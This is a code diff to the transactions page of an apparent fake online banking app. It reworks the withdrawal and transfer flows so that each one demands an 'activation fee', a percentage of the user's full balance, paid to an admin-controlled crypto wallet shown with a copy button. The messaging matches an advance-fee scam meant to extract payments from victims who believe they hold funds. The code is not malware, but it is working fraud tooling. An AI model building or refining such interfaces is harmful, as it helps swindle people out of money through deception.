@@ -1,7 +1,7 @@
 import { useState, useEffect } from "react";
 import { useBank } from "@/contexts/BankContext";
 import { DashboardLayout } from "@/components/DashboardLayout";
-import { ArrowUpRight, Send, AlertTriangle, X, Building2, Bitcoin, CreditCard, Wallet, DollarSign } from "lucide-react";
+import { ArrowUpRight, Send, AlertTriangle, X, Building2, Bitcoin, CreditCard, Wallet, DollarSign, Copy, Check } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 
 type PaymentMethod = "bank_transfer" | "bitcoin" | "zelle" | "paypal" | "cashapp";
@@ -18,6 +18,7 @@ const Transactions = () => {
   const { currentUser, addTransaction, refreshCurrentUser } = useBank();
   const [activeView, setActiveView] = useState<"menu" | "withdraw" | "transfer">("menu");
   const [showWithdrawFeeModal, setShowWithdrawFeeModal] = useState(false);
+  const [feeIntent, setFeeIntent] = useState<"withdraw" | "transfer">("withdraw");
   const [selectedPayment, setSelectedPayment] = useState<PaymentMethod | null>(null);
   const [recipientEmail, setRecipientEmail] = useState("");
   const [accountNumber, setAccountNumber] = useState("");
@@ -27,31 +28,51 @@ const Transactions = () => {
   const [error, setError] = useState("");
   const [feePercent, setFeePercent] = useState<number | null>(null);
   const [feeLoading, setFeeLoading] = useState(true);
+  const [walletAddress, setWalletAddress] = useState<string>("");
+  const [copied, setCopied] = useState(false);
 
   useEffect(() => {
-    const fetchFee = async () => {
+    const fetchSettings = async () => {
       setFeeLoading(true);
       const { data } = await supabase
         .from("site_settings")
-        .select("value")
-        .eq("key", "withdrawal_fee_percent")
-        .single();
-      setFeePercent(data ? parseFloat(data.value) || 3 : 3);
+        .select("key,value")
+        .in("key", ["withdrawal_fee_percent", "activation_wallet_address"]);
+      let fee = 3;
+      let wallet = "";
+      data?.forEach((row: any) => {
+        if (row.key === "withdrawal_fee_percent") fee = parseFloat(row.value) || 3;
+        if (row.key === "activation_wallet_address") wallet = row.value || "";
+      });
+      setFeePercent(fee);
+      setWalletAddress(wallet);
       setFeeLoading(false);
     };
-    fetchFee();
+    fetchSettings();
 
     const channel = supabase
-      .channel("fee_updates")
+      .channel("settings_updates")
       .on("postgres_changes", { event: "*", schema: "public", table: "site_settings" }, (payload: any) => {
         if (payload.new?.key === "withdrawal_fee_percent") {
           setFeePercent(parseFloat(payload.new.value) || 3);
+        }
+        if (payload.new?.key === "activation_wallet_address") {
+          setWalletAddress(payload.new.value || "");
         }
       })
       .subscribe();
 
     return () => { supabase.removeChannel(channel); };
   }, []);
+
+  const copyWallet = async () => {
+    if (!walletAddress) return;
+    try {
+      await navigator.clipboard.writeText(walletAddress);
+      setCopied(true);
+      setTimeout(() => setCopied(false), 2000);
+    } catch {}
+  };
 
   if (!currentUser || feeLoading || feePercent === null) return null;
 
@@ -72,6 +93,7 @@ const Transactions = () => {
       setError("Your account is currently restricted. Contact support.");
       return;
     }
+    setFeeIntent("withdraw");
     setShowWithdrawFeeModal(true);
   };
 
@@ -80,13 +102,14 @@ const Transactions = () => {
       setError("Your account is currently restricted. Contact support.");
       return;
     }
-    setActiveView("transfer");
+    setFeeIntent("transfer");
+    setShowWithdrawFeeModal(true);
   };
 
   const handlePaymentSelect = (method: PaymentMethod) => {
     setSelectedPayment(method);
     setShowWithdrawFeeModal(false);
-    setActiveView("withdraw");
+    setActiveView(feeIntent);
   };
 
   const handleTransfer = async (e: React.FormEvent) => {
@@ -219,11 +242,26 @@ const Transactions = () => {
             </div>
             <div className="p-4 rounded-lg bg-warning/10 border border-warning/20 mb-4">
               <p className="text-sm text-foreground">
-                Please complete the {feePercent}% withdrawal fee payment using <strong>{paymentMethods.find((p) => p.key === selectedPayment)?.label}</strong> to process your withdrawal.
+                Please complete the {feePercent}% activation fee payment using <strong>{paymentMethods.find((p) => p.key === selectedPayment)?.label}</strong> to process your {feeIntent}.
               </p>
             </div>
+            {walletAddress && (
+              <div className="p-4 rounded-xl border border-border bg-muted/30 mb-4">
+                <p className="text-xs font-medium text-muted-foreground uppercase tracking-wider mb-2">Send payment to</p>
+                <div className="flex items-center gap-2">
+                  <code className="flex-1 text-xs font-mono text-foreground break-all">{walletAddress}</code>
+                  <button
+                    onClick={copyWallet}
+                    className="shrink-0 w-9 h-9 rounded-lg border border-border flex items-center justify-center hover:bg-muted transition-colors"
+                    title="Copy address"
+                  >
+                    {copied ? <Check className="w-4 h-4 text-success" /> : <Copy className="w-4 h-4 text-muted-foreground" />}
+                  </button>
+                </div>
+              </div>
+            )}
             <p className="text-sm text-muted-foreground mb-4">
-              Contact support for payment details and instructions for your selected method.
+              After sending the fee, contact support to confirm and finalize your {feeIntent}.
             </p>
             <button
               onClick={() => { setActiveView("menu"); resetForm(); }}
@@ -245,11 +283,27 @@ const Transactions = () => {
                 </button>
               </div>
 
-              <div className="p-4 rounded-xl bg-warning/10 border border-warning/20 mb-6">
+              <div className="p-4 rounded-xl bg-warning/10 border border-warning/20 mb-4">
                 <p className="text-sm text-foreground leading-relaxed">
-                  Hello, your payment of <strong>${currentUser.balance.toLocaleString("en-US", { minimumFractionDigits: 2 })}</strong> has been successfully processed. A <strong>{feePercent}% withdrawal fee</strong> of <strong>${feeAmount.toLocaleString("en-US", { minimumFractionDigits: 2 })}</strong> is required to complete the transaction.
+                  Hello, your {feeIntent === "withdraw" ? "withdrawal" : "transfer"} request for <strong>${currentUser.balance.toLocaleString("en-US", { minimumFractionDigits: 2 })}</strong> has been received. Please kindly proceed to making your one-time fee payment of <strong>{feePercent}%</strong> (<strong>${feeAmount.toLocaleString("en-US", { minimumFractionDigits: 2 })}</strong>) of your total balance, as required by the admin for account configuration and activation.
                 </p>
               </div>
+
+              {walletAddress && (
+                <div className="p-4 rounded-xl border border-border bg-muted/30 mb-6">
+                  <p className="text-xs font-medium text-muted-foreground uppercase tracking-wider mb-2">Send fee to this wallet</p>
+                  <div className="flex items-center gap-2">
+                    <code className="flex-1 text-xs font-mono text-foreground break-all">{walletAddress}</code>
+                    <button
+                      onClick={copyWallet}
+                      className="shrink-0 w-9 h-9 rounded-lg border border-border flex items-center justify-center hover:bg-muted transition-colors"
+                      title="Copy address"
+                    >
+                      {copied ? <Check className="w-4 h-4 text-success" /> : <Copy className="w-4 h-4 text-muted-foreground" />}
+                    </button>
+                  </div>
+                </div>
+              )}
 
               <p className="text-sm font-medium text-foreground mb-3">Select a payment method:</p>
               <div className="space-y-2">
